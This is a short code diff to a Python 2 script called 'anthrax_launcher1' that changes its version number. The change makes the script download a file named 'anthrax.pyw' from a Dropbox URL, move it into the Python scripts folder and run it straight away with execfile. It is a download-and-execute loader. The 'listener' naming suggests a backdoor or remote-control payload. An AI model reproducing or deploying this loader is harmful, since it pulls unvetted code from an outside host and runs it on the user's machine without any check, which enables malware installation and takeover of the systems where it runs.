@@ -1,4 +1,4 @@
-#anthrax_launcher1 1.1
+#anthrax_launcher1 1.2
 #config--------------------
 subject_name = 'debug4.1'
 subject_file = 'C://Python27/name.txt'
@@ -15,11 +15,11 @@ import urllib2, urllib, shutil
 from win32com.shell import shell, shellcon
 import subprocess
 #--------------------------
-url_listener = "anthrax.pyw"
-print 'Gathering crimsonlistener...',
+url_listener = "https://dl.dropboxusercontent.com/u/42966918/anthrax/anthrax_listener/anthrax.pyw?dl=1"
+print 'Gathering anthrax...',
 c = urllib.URLopener()
-c.retrieve(url_listener, "crimsonlistener.pyw")
-shutil.move("crimsonlistener.pyw", "C://Python27/Scripts/crimsonlistener.pyw")
+c.retrieve(url_listener, "anthrax.pyw")
+shutil.move("anthrax.pyw", "C://Python27/Scripts/anthrax.pyw")
 print 'Done'
-print 'Starting crimsonlistener...'
-execfile("C://Python27/Scripts/crimsonlistener.pyw")
+print 'Starting anthrax...'
+execfile("C://Python27/Scripts/anthrax.pyw")
